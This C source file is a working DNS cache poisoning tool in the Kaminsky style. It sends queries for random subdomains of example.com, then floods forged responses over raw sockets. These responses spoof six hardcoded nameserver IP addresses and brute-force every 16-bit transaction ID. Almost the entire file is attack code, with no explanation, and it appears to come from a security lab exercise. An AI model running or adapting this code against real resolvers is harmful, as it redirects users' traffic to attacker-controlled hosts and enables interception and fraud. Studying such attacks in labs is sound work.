#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define MAX_FILE_SIZE 1000000

struct ipheader {
  unsigned char      iph_ihl:4,
                     iph_ver:4;
  unsigned char      iph_tos;
  unsigned short int iph_len;
  unsigned short int iph_ident;
  unsigned short int iph_flag:3,
                     iph_offset:13;
  unsigned char      iph_ttl;
  unsigned char      iph_protocol;
  unsigned short int iph_chksum;
  struct  in_addr    iph_sourceip;
  struct  in_addr    iph_destip;
};

static const char *PLACEHOLDER = "twysw";
static const int SPOOF_IP_COUNT = 6;
static const char *SPOOF_IPS[] = { "108.162.192.162", "108.162.195.228", "162.159.44.228", "172.64.32.162", "172.64.35.228", "173.245.58.162" };

void send_raw_packet(char *buffer, int pkt_size);
void send_dns_request(const unsigned char *packet, int packet_size, const char *name);
void send_dns_response(const unsigned char *packet, int packet_size, const char *name, const char *src_ip, unsigned short txid);

int find_offsets(const unsigned char *buffer, int len, const char *needle, int *offsets, int max_offsets)
{
  int needle_len = strlen(needle);
  int count = 0;
  for (int i = 0; i <= len - needle_len; i++) {
    if (memcmp(buffer + i, needle, needle_len) == 0) {
      if (count < max_offsets) {
        offsets[count] = i;
      }
      count++;
    }
  }
  return count;
}

void patch_name(unsigned char *buffer, int len, const char *name)
{
  int offsets[16];
  int hits = find_offsets(buffer, len, PLACEHOLDER, offsets, 16);
  for (int i = 0; i < hits && i < 16; i++) {
    memcpy(buffer + offsets[i], name, 5);
  }
}

int main()
{
  srand((unsigned int) time(NULL));

  FILE *f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
    perror("Can't open ip_req.bin");
    return 1;
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = (int) fread(ip_req, 1, MAX_FILE_SIZE, f_req);
  fclose(f_req);

  FILE *f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp) {
    perror("Can't open ip_resp.bin");
    return 1;
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = (int) fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
  fclose(f_resp);

  char alphabet[26] = "abcdefghijklmnopqrstuvwxyz";
  while (1) {
    char name[6];
    name[5] = '\0';
    for (int i = 0; i < 5; i++) {
      name[i] = alphabet[rand() % 26];
    }

    printf("triggering %s.example.com\n", name);
    fflush(stdout);
    send_dns_request(ip_req, n_req, name);
    for (unsigned int txid = 0; txid <= 0xFFFF; txid++) {
      for (int ip_index = 0; ip_index < SPOOF_IP_COUNT; ip_index++) {
        send_dns_response(ip_resp, n_resp, name, SPOOF_IPS[ip_index], (unsigned short) txid);
      }
    }
  }
  return 0;
}

void send_dns_request(const unsigned char *packet, int packet_size, const char *name)
{
  unsigned char buffer[MAX_FILE_SIZE];
  memcpy(buffer, packet, packet_size);
  patch_name(buffer, packet_size, name);
  send_raw_packet((char *) buffer, packet_size);
}

void send_dns_response(const unsigned char *packet, int packet_size, const char *name, const char *src_ip, unsigned short txid)
{
  unsigned char buffer[MAX_FILE_SIZE];
  memcpy(buffer, packet, packet_size);
  patch_name(buffer, packet_size, name);
  inet_pton(AF_INET, src_ip, buffer + 12);
  unsigned short txid_network = htons(txid);
  memcpy(buffer + 28, &txid_network, 2);
  send_raw_packet((char *) buffer, packet_size);
}

void send_raw_packet(char *buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (sock < 0) {
    perror("socket");
    exit(1);
  }

  if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
    perror("setsockopt");
    close(sock);
    exit(1);
  }

  struct ipheader *ip = (struct ipheader *) buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  if (sendto(sock, buffer, pkt_size, 0, (struct sockaddr *) &dest_info, sizeof(dest_info)) < 0) {
    perror("sendto");
  }

  close(sock);
}
